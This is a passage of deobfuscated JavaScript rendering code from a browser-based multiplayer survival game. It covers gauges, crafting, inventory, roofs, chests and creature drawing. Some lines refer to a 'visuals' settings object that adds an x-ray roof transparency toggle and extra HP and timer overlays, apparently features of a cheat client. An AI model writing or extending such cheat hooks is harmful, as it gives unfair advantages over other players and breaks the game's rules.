          if (!(s_.mode === ds.MODE_HUNGER_GAMES && E.nickname === "spectator")) {
            if (!(s_.mode === ds.MODE_ZOMBIES && E.skin === ds.ZOMBIE_SKIN)) {
              if (t[_] == __.id) {
                s = true;
                if (s_.mode === ds.MODE_VAMPIRES && E.skin === ds.VAMPIRE_SKIN) {
                  color = "#FF0000";
                } else {
                  color = "#FFF";
                }
              } else if (s_.mode === ds.MODE_VAMPIRES && E.skin === ds.VAMPIRE_SKIN) {
                color = "#990000";
              } else {
                color = "#A1BDCD";
              }
              a.drawImage(Zi(L, "" + (_ + 1), L * 15, color), L * 20, (40 + _ * 22) * L);
              if (!E.ldb_label) {
                E.ldb_label = Zi(L, E.nickname, L * 15, color, undefined, undefined, undefined, undefined, L * 90);
              }
              a.drawImage(E.ldb_label, L * 39, (40 + _ * 22) * L);
              a.drawImage(Zi(L, `[${E.level}]`, L * 15, "#F9E8A2"), L * 156 - 25, (40 + _ * 22) * L);
              a.drawImage(Zi(L, Utils.simplify_number(E.score), L * 15, color), L * 156, (40 + _ * 22) * L);
            }
          }
        }
        if (!s) {
          if (s_.mode === ds.MODE_PVP || s_.mode === ds.MODE_VAMPIRES || s_.mode === ds.MODE_LEGACY || s_.mode === ds.MODE_BR || s_.mode === ds.MODE_EXPERIMENTAL || s_.mode === ds.MODE_HUNGER_GAMES && !__.spectator || s_.mode === ds.MODE_ZOMBIES && !__.zombie) {
            a.drawImage(sprite[Ie.YOUR_SCORE], L * 15, (46 + _ * 22) * L);
            a.drawImage(Zi(L, Utils.simplify_number(s_.players[__.id].score), L * 15, "#FFF"), L * 100, (46 + _ * 22) * L);
          }
        }
      }
      Nn(D, i.can, i.translate.x, i.translate.y);
    }
    function wn() {
      var e = __.totem;
      if (e.wait) {
        var i = e.timeout.update();
        D.save();
        var t = sprite[Ie.DELAY_TEAM];
        var r = sprite[Ie.DELAY_WEAPON].height + L * 25;
        D.translate(t.width, T_.gauges.translate.y - L * 188 - r);
        var n = -t.width / 2 - 2;
        var a = -t.height / 2 - 4;
        Nn(D, t, n + 2, a);
        D.beginPath();
        D.lineWidth = L * 5;
        D.strokeStyle = Ie.WEAPON_LOADING[s_.time];
        D.lineCap = "round";
        D.arc(0, a + t.height / 2, L * 25, 0, Math.PI * 2 * e.timeout.v);
        D.stroke();
        D.restore();
        if (i) {
          e.wait = false;
          e.timeout.v = 0;
          e.timeout.o = false;
        }
      }
    }
    function Kn() {
      var e = s_.clock;
      var i = sprite[Ie.CLOCK][s_.time];
      Nn(D, i, e.translate.x, e.translate.y);
      D.save();
      D.translate(e.translate.x + i.width / 2, e.translate.y + i.height / 2);
      s_.clock.now = (new Date().getTime() - e.init + e.hour) % ds.DAY;
      var t = Math.PI * 2 * s_.clock.now / ds.DAY - Math.PI / 2;
      D.rotate(t);
      Nn(D, sprite[Ie.ARROW_CLOCK], -i.width / 2, -i.height / 2);
      D.restore();
    }
    function Un() {
      var e = __.build;
      if (e.wait) {
        var i = e.timeout.update();
        D.save();
        var t = sprite[Ie.DELAY_WALL];
        D.translate(t.width - L * 12, T_.gauges.translate.y - L * 190);
        var r = -t.width / 2 + 9;
        var n = -t.height / 2 - 4;
        Nn(D, t, r, n);
        D.beginPath();
        D.lineWidth = L * 5;
        D.strokeStyle = Ie.HELMET_LOADING[s_.time];
        D.lineCap = "round";
        D.arc(9, n + t.height / 2, L * 25, 0, Math.PI * 2 * e.timeout.v);
        D.stroke();
        D.restore();
        if (i) {
          e.wait = false;
          e.timeout.v = 0;
          e.timeout.o = false;
        }
      }
    }
    function Yn() {
      var e = __.helmet;
      if (e.wait) {
        var i = e.timeout.update();
        D.save();
        var t = sprite[Ie.DELAY_HELMET];
        D.translate(t.width - L * 2, T_.gauges.translate.y - L * 125);
        var r = -t.width / 2 + 10;
        var n = -t.height / 2 - 4;
        Nn(D, t, r, n);
        D.beginPath();
        D.lineWidth = L * 5;
        D.strokeStyle = Ie.HELMET_LOADING[s_.time];
        D.lineCap = "round";
        D.arc(9, n + t.height / 2, L * 25, 0, Math.PI * 2 * e.timeout.v);
        D.stroke();
        D.restore();
        if (i) {
          e.wait = false;
          e.timeout.v = 0;
          e.timeout.o = false;
        }
      }
    }
    function kn() {
      var e = __.weapon;
      if (e.wait) {
        var i = e.timeout.update();
        D.save();
        var t = sprite[Ie.DELAY_WEAPON];
        D.translate(t.width - L * 2, T_.gauges.translate.y - L * 60);
        var r = -t.width / 2 - 2;
        var n = -t.height / 2 - 4;
        Nn(D, t, r, n);
        D.beginPath();
        D.lineWidth = L * 5;
        D.strokeStyle = Ie.WEAPON_LOADING[s_.time];
        D.lineCap = "round";
        D.arc(0, n + t.height / 2, L * 25, 0, Math.PI * 2 * e.timeout.v);
        D.stroke();
        D.restore();
        if (i) {
          e.wait = false;
          e.timeout.v = 0;
          e.timeout.o = false;
        }
      }
    }
    function Fn() {
      var e = __.craft;
      if (e.crafting) {
        var i = s_.fast_units[__.uid];
        D.save();
        D.translate(__.cam.x + i.x, __.cam.y + i.y);
        var t = sprite[Ie.GEAR];
        var r = -t.width / 2;
        var n = -t.height / 2 - L * 125;
        Nn(D, t, r, n);
        D.beginPath();
        D.lineWidth = L * 5;
        D.strokeStyle = Ie.CRAFT_LOADING[s_.time];
        D.lineCap = "round";
        D.arc(0, n + t.height / 2, L * 25, 0, Math.PI * 2 * e.timeout.v);
        D.stroke();
        D.restore();
      }
    }
    function xn() {
      var e = __.craft;
      if (!e.crafting && e.preview > 0) {
        var i = s_.fast_units[__.uid];
        if (!i) {
          return;
        }
        D.save();
        if (ce[e.preview].grid === 0 && e.mode === 0) {
          D.translate(__.cam.x + i.x, __.cam.y + i.y);
          D.rotate(i.angle);
          D.translate(120, 0);
        } else {
          var t = Math.floor(i.x + Math.cos(i.angle) * 120);
          var r = Math.floor(i.y + Math.sin(i.angle) * 120);
          t = __.cam.x + (t - t % 100 + 50);
          r = __.cam.y + (r - r % 100 + 50);
          D.translate(t, r);
        }
        var n = sprite[e.preview][s_.time];
        D.globalAlpha = 0.5;
        Nn(D, n, -n.width / 2, -n.height / 2);
        D.globalAlpha = 1;
        D.restore();
        if (ce[e.preview].grid === 0) {
          if (!e.label[e.mode]) {
            if (e.mode === 0) {
              e.label[0] = Zi(L, ve[TEXT.MODE_FREE], 20, "#e2c340");
            } else {
              e.label[1] = Zi(L, ve[TEXT.MODE_GRID], 20, "#e2c340");
            }
          }
          n = e.label[e.mode];
          Nn(D, n, m + -n.width / 2, T_.gauges.y - 26);
        }
      }
      if (e.crafting) {
        for (var a = e.timeout.update(), o = 0; o < e.can_craft.length; o++) {
          var s = e.can_craft[o];
          if (e.id == s.id) {
            var _ = L * 42;
            var E = L * 17;
            Be(D, s.info.translate.x, s.info.translate.y + _ * (1 - e.timeout.v), s.info.width, _ * e.timeout.v + E, L * 10);
            D.fillStyle = "#55B973";
            D.fill();
            D.globalAlpha = 0.8;
            s.draw(D);
          } else {
            D.globalAlpha = 0.5;
            s.draw(D);
          }
          D.globalAlpha = 1;
        }
        if (a) {
          e.crafting = false;
          e.timeout.v = 0;
          e.timeout.o = false;
        }
        return true;
      }
      for (o = 0; o < e.can_craft.length; o++) {
        e.can_craft[o].draw(D);
      }
      return false;
    }
    function Jn() {
      for (var e = __.inv, i = s_.fast_units[__.uid], t = 0; t < e.can_select.length; t++) {
        var r = e.can_select[t];
        var n = false;
        if ((i = s_.fast_units[__.uid]) && (i.right == r.id || i.clothe == r.id && i.clothe > 0)) {
          n = true;
          Nn(D, r.info.img[2], r.info.translate.x, r.info.translate.y, r.info.width, r.info.height);
        } else {
          r.draw(D);
        }
        var a = __.inv.n[r.id];
        if (a > 1) {
          Sn(a, r);
        }
        if (a > 0) {
          Dn(t, r, n);
        }
        var o = __.chest;
        if (!(!o.open || !(o.id < 0 || o.id == r.id) || o.lock && o.pid != __.id)) {
          T_.plus_buttons[r.id].draw(D);
        }
        if (__.furnace.open && le.WOOD == r.id) {
          T_.plus_buttons[r.id].draw(D);
        }
        if (__.well.open && le.BUCKET_FULL == r.id) {
          T_.plus_buttons[r.id].draw(D);
        }
        if (__.windmill.open && le.WILD_WHEAT == r.id) {
          T_.plus_buttons[r.id].draw(D);
        }
        if (__.extractor.open && le.WOOD == r.id) {
          T_.plus_buttons[r.id].draw(D);
        }
        if (!(!__.bread_oven.open || le.WOOD != r.id && le.FLOUR != r.id)) {
          T_.plus_buttons[r.id].draw(D);
        }
      }
      if (r && t < e.max) {
        var s = sprite[Ie.EMPTY_SLOT][2];
        x = r.info.translate.x;
        y = r.info.translate.y;
        j = 1;
        for (; t < e.max; t++, j++) {
          Nn(D, s, x + j * (s.width + 5), y);
        }
      }
    }
    function Xn() {
      D.save();
      var e = L;
      if (__.gauges.life.x < 0.25) {
        D.globalAlpha = __.gauges.warn_life.v;
      }
      var i = __.inv.can_select.length > 0 ? -70 : 0;
      if (__.chest.open || __.furnace.open && __.inv.find_item(le.WOOD) != -1 || __.windmill.open && __.inv.find_item(le.WILD_WHEAT) != -1 || __.extractor.open && __.inv.find_item(le.WOOD) != -1 || __.well.open && __.inv.find_item(le.BUCKET_FULL) != -1 || __.bread_oven.open && (__.inv.find_item(le.WOOD) != -1 || __.inv.find_item(le.FLOUR) != -1)) {
        i -= L * 50;
      }
      D.translate((S - L * 950) / 2, i);
      D.fillStyle = "#69A148";
      D.fillRect(this.translate.x + L * 37, this.translate.y + L * 17, __.gauges.life.x * 178 * L, L * 18);
      D.globalAlpha = 1;
      if (r.visuals.gauges.default) {
        D.save();
        D.beginPath();
        D.lineWidth = 7;
        D.fillStyle = "red";
        D.strokeStyle = "black";
        D.font = "32px Baloo Paaji";
        if (!r.visuals.gauges.extra) {
          D.strokeText(Math.floor(__.gauges.l * 200) + "hp", this.translate.x + L * 37 - 120, this.translate.y + L * 17 + 17);
          D.fillText(Math.floor(__.gauges.l * 200) + "hp", this.translate.x + L * 37 - 120, this.translate.y + L * 17 + 17);
        }
        D.strokeText(Math.floor(6 - (Date.now() - r.visuals.gauges.timer) / 1000) + "s", this.translate.x + L * 277 + 185, this.translate.y + L * 17 + 17);
        D.strokeText(Math.floor(11 - (Date.now() - r.visuals.gauges.healtimer) / 1000) + "s", this.translate.x + L * 37 + 185, this.translate.y + L * 17 + 17);
        D.fillText(Math.floor(11 - (Date.now() - r.visuals.gauges.healtimer) / 1000) + "s", this.translate.x + L * 37 + 185, this.translate.y + L * 17 + 17);
        D.fillText(Math.floor(6 - (Date.now() - r.visuals.gauges.timer) / 1000) + "s", this.translate.x + L * 277 + 185, this.translate.y + L * 17 + 17);
        D.restore();
      }
      if (r.visuals.gauges.extra) {
        D.save();
        D.beginPath();
        D.lineWidth = 7;
        D.font = "32px Baloo Paaji";
        D.fillStyle = "white";
        D.strokeStyle = "rgb(105, 161, 72)";
        D.strokeText(Math.floor(__.gauges.l * 100) + "%", this.translate.x + L * 37 + 60, this.translate.y + L * 17 - 17);
        D.fillText(Math.floor(__.gauges.l * 100) + "%", this.translate.x + L * 37 + 60, this.translate.y + L * 17 - 17);
        D.strokeStyle = "rgb(175, 53, 42)";
        D.strokeText(Math.floor(__.gauges.h * 100) + "%", this.translate.x + L * 277 + 60, this.translate.y + L * 17 - 17);
        D.fillText(Math.floor(__.gauges.h * 100) + "%", this.translate.x + L * 277 + 60, this.translate.y + L * 17 - 17);
        D.strokeStyle = Math.floor(__.gauges.c * 100 + (1 - __.gauges.wa) * 100) <= 100 ? "rgb(102, 155, 177)" : "rgb(156, 64, 54)";
        D.strokeText(Math.floor(__.gauges.c * 100 + (1 - __.gauges.wa) * 100) + "%", this.translate.x + L * 517 + 60, this.translate.y + L * 17 - 17);
        D.fillText(Math.floor(__.gauges.c * 100 + (1 - __.gauges.wa) * 100) + "%", this.translate.x + L * 517 + 60, this.translate.y + L * 17 - 17);
        D.strokeStyle = "rgb(7, 74, 135)";
        D.strokeText(Math.floor(__.gauges.t * 100) + "%", this.translate.x + L * 757 + 60, this.translate.y + L * 17 - 17);
        D.fillText(Math.floor(__.gauges.t * 100) + "%", this.translate.x + L * 757 + 60, this.translate.y + L * 17 - 17);
        D.restore();
      }
      if (__.gauges.hunger.x < 0.35) {
        D.fillStyle = "#8F050A";
        D.globalAlpha = __.gauges.warn_hunger.v;
        D.fillRect(this.translate.x + L * 277, this.translate.y + L * 17, L * 178, L * 18);
        D.globalAlpha = 1;
      }
      D.fillStyle = "#AF352A";
      D.fillRect(this.translate.x + L * 277, this.translate.y + L * 17, __.gauges.hunger.x * 178 * L, L * 18);
      if (__.gauges.cold.x < 0.35) {
        D.fillStyle = "#366B91";
        D.globalAlpha = __.gauges.warn_cold.v;
        D.fillRect(this.translate.x + L * 517, this.translate.y + L * 17, L * 178, L * 18);
        D.globalAlpha = 1;
      }
      D.fillStyle = "#669BB1";
      D.fillRect(this.translate.x + L * 517, this.translate.y + L * 17, __.gauges.cold.x * 178 * L, L * 18);
      if (__.gauges.cold.x > 0.99) {
        if (__.gauges.warm.x < 0.35) {
          D.fillStyle = "#6C4036";
          D.globalAlpha = __.gauges.warn_warm.v;
          D.fillRect(this.translate.x + L * 517, this.translate.y + L * 17, L * 178, L * 18);
          D.globalAlpha = 1;
        }
        D.fillStyle = "#9C4036";
        D.fillRect(this.translate.x + L * 517, this.translate.y + L * 17, (1 - __.gauges.warm.x) * 178 * L, L * 18);
      }
      if (__.gauges.thirst.x < 0.35) {
        D.fillStyle = "#001A57";
        D.globalAlpha = __.gauges.warn_thirst.v;
        D.fillRect(this.translate.x + L * 757, this.translate.y + L * 17, L * 178, L * 18);
        D.globalAlpha = 1;
      }
      D.fillStyle = "#074A87";
      D.fillRect(this.translate.x + L * 757, this.translate.y + L * 17, __.gauges.thirst.x * 178 * L, L * 18);
      L = e;
      Nn(D, this.img, this.translate.x, this.translate.y);
      this.y = this.translate.y + i;
      D.restore();
      if (__.gauges.oxygen.x < 0.99) {
        var t = Math.floor(m - sprite[Ie.OXYGEN].width / 2);
        i += this.translate.y - sprite[Ie.OXYGEN].height - L * 5;
        D.fillStyle = "#BBE8EF";
        D.fillRect(t + 5, i + L * 5, L * 588 * __.gauges.oxygen.x, L * 10);
        if (__.gauges.oxygen.x < 0.35) {
          D.fillStyle = "#9BA8AF";
          D.globalAlpha = __.gauges.warn_oxygen.v;
          D.fillRect(t + 5, i + 5, L * 588, L * 10);
          D.globalAlpha = 1;
        }
        Nn(D, sprite[Ie.OXYGEN], t, i);
        this.y = i;
      }
    }
    function qn(e) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var i = (1 - this.hit.anim.v) * I_ * 600 * L;
        var t = Math.cos(this.hit.angle - this.angle) * i;
        var r = Math.sin(this.hit.angle - this.angle) * i;
      } else {
        t = 0;
        r = 0;
      }
      var n = sprite[e][s_.time];
      w = -n.width;
      h = -n.height;
      Nn(D, n, -w / 2 + t, -h / 2 + r, w, h);
      D.restore();
    }
    function jn() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      img = this.lock ? sprite[Ie.CHEST][2] : sprite[Ie.CHEST][s_.time];
      w = -img.width;
      h = -img.height;
      Nn(D, img, -w / 2 + i, -h / 2 + t, w, h);
      D.restore();
      if (this.action) {
        D.save();
        D.globalAlpha = 0.9;
        Nn(D, T_.chest_buttons[this.action / 2 - 1].info.img[0], __.cam.x + this.x + 25, __.cam.y + this.y + 15, w + 25, h + 25);
        D.globalAlpha = 1;
        D.font = "20px Baloo Paaji";
        D.strokeStyle = "black";
        D.lineWidth = 7;
        D.strokeText(this.action / 2 - 1, __.cam.x + this.x - 32, __.cam.y + this.y - 12);
        D.strokeText("x" + this.info, __.cam.x + this.x - 32, __.cam.y + this.y + 20);
        D.fillStyle = "white";
        D.fillText(this.action / 2 - 1, __.cam.x + this.x - 32, __.cam.y + this.y - 12);
        D.fillText("x" + this.info, __.cam.x + this.x - 32, __.cam.y + this.y + 20);
        D.restore();
      }
    }
    function Zn() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      img = sprite[Ie.THORNBUSH_SEED_MOB][s_.time];
      w = -img.width;
      h = -img.height;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function Qn() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      img = sprite[Ie.GARLIC_SEED_MOB][s_.time];
      w = -img.width;
      h = -img.height;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function $n() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      img = sprite[Ie.PUMPKIN_SEED_MOB][s_.time];
      w = -img.width;
      h = -img.height;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function ea() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      img = sprite[Ie.ALOE_VERA][s_.time];
      w = -img.width;
      h = -img.height;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function ia() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      img = sprite[Ie.WHEAT_MOB][s_.time];
      w = -img.width;
      h = -img.height;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function ta(e) {
      if (!((e = e / 100) > 0.8)) {
        D.save();
        D.translate(__.cam.x + this.x, __.cam.y + this.y);
        D.rotate(this.angle);
        if (this.hit.update) {
          if (this.hit.anim.update() && this.hit.anim.o == 0) {
            this.hit.update = false;
          }
          var i = (1 - this.hit.anim.v) * I_ * 600 * L;
          var t = Math.cos(this.hit.angle - this.angle) * i;
          var r = Math.sin(this.hit.angle - this.angle) * i;
        } else {
          t = 0;
          r = 0;
        }
        D.globalAlpha = 0.5;
        We(D, t, r, L * 18, e);
        ye(D, null, "#000000", L * 18);
        D.globalAlpha = 1;
        We(D, t, r, L * 18, e);
        ye(D, null, Ie.BROWN_LIFE[s_.time], L * 6);
        D.restore();
      }
    }
    function ra(e) {
      if (!((e = e / 100) > 0.95)) {
        D.save();
        D.translate(__.cam.x + this.x, __.cam.y + this.y);
        D.rotate(this.angle);
        if (this.hit.update) {
          if (this.hit.anim.update() && this.hit.anim.o == 0) {
            this.hit.update = false;
          }
          var i = (1 - this.hit.anim.v) * I_ * 600 * L;
          var t = Math.cos(this.hit.angle - this.angle) * i;
          var r = Math.sin(this.hit.angle - this.angle) * i;
        } else {
          t = 0;
          r = 0;
        }
        D.globalAlpha = 0.5;
        We(D, t, r, L * 28, e);
        ye(D, null, "#000000", L * 18);
        D.globalAlpha = 1;
        We(D, t, r, L * 28, e);
        ye(D, null, Ie.CRAFT_LOADING[s_.time], L * 6);
        D.restore();
      }
    }
    function na(e) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (r.visuals.xray.roof) {
        D.globalAlpha = r.visuals.xray.opacity;
      }
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var i = (1 - this.hit.anim.v) * I_ * 600 * L;
        var t = Math.cos(this.hit.angle - this.angle) * i;
        var n = Math.sin(this.hit.angle - this.angle) * i;
      } else {
        t = 0;
        n = 0;
      }
      var a = sprite[Ie.ROOFS].length;
      img = sprite[Ie.ROOFS][(this.j + this.i % 2) % a][s_.time];
      w = -img.width;
      h = -img.height;
      var o = s_.fast_units[__.uid];
      if (o && (__.id === this.pid || __.in_team(this.pid))) {
        if (Utils.dist(this, o) < 550) {
          this.opacity = Math.max(this.opacity - I_, 0.3);
        } else {
          this.opacity = Math.min(this.opacity + I_, 1);
        }
      } else if (o && Utils.dist(this, s_.fast_units[__.uid]) < 150) {
        this.opacity = Math.max(this.opacity - I_, 0.3);
      } else {
        this.opacity = Math.min(this.opacity + I_, 1);
      }
      var s = D.globalAlpha;
      D.globalAlpha *= this.opacity;
      Nn(D, img, -w / 2 + t, -h / 2 + n, w, h);
      D.globalAlpha = s;
      D.restore();
    }
    function aa(e) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var i = (1 - this.hit.anim.v) * I_ * 600 * L;
        var t = Math.cos(this.hit.angle - this.angle) * i;
        var r = Math.sin(this.hit.angle - this.angle) * i;
      } else {
        t = 0;
        r = 0;
      }
      if (this.halo.update()) {
        this.color += 0.2 + Math.random() * 0.3;
      }
      img = sprite[Ie.GARLANDS][Math.floor(this.id + this.color) % 5][s_.time];
      w = -img.width * this.halo.v;
      h = -img.height * this.halo.v;
      Nn(D, img, -w / 2 + t, -h / 2 + r, w, h);
      D.restore();
    }
    function oa(e) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var i = (1 - this.hit.anim.v) * I_ * 600 * L;
        var t = Math.cos(this.hit.angle - this.angle) * i;
        var r = Math.sin(this.hit.angle - this.angle) * i;
      } else {
        t = 0;
        r = 0;
      }
      if (e === Ie.BED_TOP && !s_.transition) {
        for (var n = 0, a = s_.units[us.PLAYERS], o = 0; o < a.length; o++) {
          var s = Utils.dist(a[o], this);
          if (s < 140 && s > 35) {
            n = 0;
            break;
          }
          if (s <= 35) {
            n = 1;
          }
        }
        this.opacity = n === 0 ? Math.max(0.5, this.opacity - I_ / 1.5) : Math.min(1, this.opacity + I_ / 1.5);
        D.globalAlpha = this.opacity;
      }
      img = sprite[e][s_.time];
      w = -img.width;
      h = -img.height;
      Nn(D, img, -w / 2 + t, -h / 2 + r, w, h);
      D.globalAlpha = 1;
      D.restore();
    }
    function sa(e) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var i = (1 - this.hit.anim.v) * I_ * 600 * L;
        var t = Math.cos(this.hit.angle - this.angle) * i;
        var r = Math.sin(this.hit.angle - this.angle) * i;
      } else {
        t = 0;
        r = 0;
      }
      img = sprite[e][s_.time];
      w = -img.width;
      h = -img.height;
      Nn(D, img, -w / 2 + t, -h / 2 + r, w, h);
      D.restore();
    }
    var _a = 0;
    function Ea(e, i, t, r, n, a, o, s, _) {
      if (s === undefined) {
        s = 0;
      }
      for (var E = e; E <= i; E++) {
        for (var T = t; T <= r; T++) {
          var A = a_.tiles[E][T];
          if (A !== undefined && A[a] !== undefined) {
            var d = A[a];
            var h = sprite[n][s_.time][d.river];
            Nn(D, h, __.cam.x + d.x - h.width / (_scale_object * 4), __.cam.y + d.y - h.height / (_scale_object * 4), h.width / (_scale_object * 2), h.height / (_scale_object * 2));
            if (n_.quality) {
              var I = 2147483648;
              var u = ((E * 1000 + T) * 1103515245 + 12345) % I / I;
              if (u < 0.2) {
                u = Math.floor(sprite[Ie.RIVER_DECO][s_.time][d.river].length * (u * 5));
                h = sprite[Ie.RIVER_DECO][s_.time][d.river][u];
                Nn(D, h, __.cam.x + d.x - h.width / (_scale_object * 4), __.cam.y + d.y - h.height / (_scale_object * 4), h.width / (_scale_object * 2), h.height / (_scale_object * 2));
              } else if (d.current !== 0) {
                h = sprite[Ie.RIVER_WAVE][s_.time];
                var l = (_a + E % 2 * 30) % 60;
                D.globalAlpha = l < 30 ? l / 30 : 1 - (l - 30) / 30;
                Nn(D, h, __.cam.x + d.x - h.width / (_scale_object * 4), __.cam.y + d.y - h.height / (_scale_object * 4) - 30 + l, h.width / (_scale_object * 2), h.height / (_scale_object * 2));
                D.globalAlpha = 1;
              }
            }
          }
        }
      }
    }
    function Ta() {
      if ((this.info & 1) == 1) {
        this.dig = Math.min(this.dig + I_, 2.2);
      } else {
        this.dig = Math.max(this.dig - I_, 0);
        this.groundTimer += I_;
        if (this.groundTimer > 0.1) {
          this.groundTimer = 0;
          var e = {
            x: this.x + Math.random() * 60 - 30,
            y: this.y + Math.random() * 60 - 30,
            a: 0,
            r: Math.random() * 30 + 30
          };
          this.ground.push(e);
        }
      }
      for (var i = 0; i < this.ground.length; i++) {
        e = this.ground[i];
        D.save();
        D.translate(__.cam.x + e.x, __.cam.y + e.y);
        e.a = Math.min(1, e.a + I_ / 2);
        var t = e.a;
        if (t < 0.2) {
          t *= 5;
        } else {
          t = t > 0.8 ? (1 - t) * 5 : 1;
        }
        D.globalAlpha = t * 0.8;
        ze(D, 0, 0, e.r);
        ye(D, Ie.SAND_WORM_GROUND[s_.time]);
        D.restore();
        if (e.a === 1) {
          this.ground.splice(i, 1);
          i--;
        }
      }
    }
    function Aa() {
      var e = undefined;
      var i = undefined;
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.breath.update();
      this.rotate.update();
      if (this.dig >= 0.1 && this.dig <= 1.1) {
        if ((t = Math.max(0, Math.min(1, this.dig - 0.1))) < 0.2) {
          t *= 5;
        } else {
          t = t > 0.8 ? (1 - t) * 5 : 1;
        }
        e = sprite[Ie.SAND_WORM1][s_.time];
        w = -e.width * this.breath.v;
        h = -e.height * this.breath.v;
        D.globalAlpha = t;
        Nn(D, e, -w / 4, -h / 4, w / 2, h / 2);
        i = sprite[Ie.HURT_SAND_WORM1];
      }
      if (this.dig >= 0.9) {
        var t;
        if ((t = Math.max(0, Math.min(1, this.dig - 0.9))) < 0.2) {
          t *= 5;
        } else {
          t = 1;
        }
        e = sprite[Ie.SAND_WORM2][s_.time];
        w = -e.width * this.breath.v;
        h = -e.height * this.breath.v;
        D.globalAlpha = t;
        Nn(D, e, -w / 4, -h / 4, w / 2, h / 2);
        i = sprite[Ie.HURT_SAND_WORM2];
      }
      if (this.action & Es.HURT && i !== undefined) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = (0.6 - this.hit.v) * t;
        w = -i.width * this.breath.v;
        h = -i.height * this.breath.v;
        Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
      }
      D.globalAlpha = 1;
      D.restore();
    }
    function da() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      var e = Utils.dist(this, this.r);
      this.scale = e > 350 ? Math.min(this.scale + I_ / 2, 1.8) : Math.max(this.scale - I_, 1);
      this.breath.update();
      this.rotate.update();
      this._alpha = e < 350 ? Math.max(0, this._alpha - I_ * 2.2) : Math.min(1, this._alpha + I_ * 2.2);
      i = sprite[Ie.VULTURE_GROUND_ATTACK][s_.time];
      w = -i.width * this.breath.v * this.scale;
      h = -i.height * this.breath.v * this.scale;
      D.globalAlpha = 1 - this._alpha;
      Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
      i = sprite[Ie.VULTURE_ATTACK][s_.time];
      w = -i.width * this.breath.v * this.scale;
      h = -i.height * this.breath.v * this.scale;
      D.globalAlpha = this._alpha;
      Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = (0.6 - this.hit.v) * (1 - this._alpha);
        var i = sprite[Ie.HURT_VULTURE_GROUND];
        w = -i.width * this.breath.v * this.scale;
        h = -i.height * this.breath.v * this.scale;
        Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
        D.globalAlpha = (0.6 - this.hit.v) * this._alpha;
        i = sprite[Ie.HURT_VULTURE];
        w = -i.width * this.breath.v * this.scale;
        h = -i.height * this.breath.v * this.scale;
        Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      i = sprite[Ie.VULTURE_WING_LEFT_ATTACK][s_.time];
      w = -i.width * this.breath.v * this.scale;
      h = -i.height * this.breath.v * this.scale;
      D.save();
      D.translate(L * -40, L * 80);
      D.rotate(this.rotate.v);
      D.globalAlpha = this._alpha;
      Nn(D, i, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = (0.6 - this.hit.v) * this._alpha;
        i = sprite[Ie.HURT_VULTURE_WING_LEFT];
        Nn(D, i, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.restore();
      i = sprite[Ie.VULTURE_WING_RIGHT_ATTACK][s_.time];
      D.save();
      D.translate(L * 40, L * 80);
      D.rotate(-this.rotate.v);
      D.globalAlpha = this._alpha;
      Nn(D, i, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = (0.6 - this.hit.v) * this._alpha;
        i = sprite[Ie.HURT_VULTURE_WING_RIGHT];
        Nn(D, i, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.globalAlpha = 1;
      D.restore();
      D.restore();
    }
    function ha() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      var e = Utils.dist(this, this.r);
      this.scale = e > 350 ? Math.min(this.scale + I_ / 2, 1.8) : Math.max(this.scale - I_, 1);
      this.breath.update();
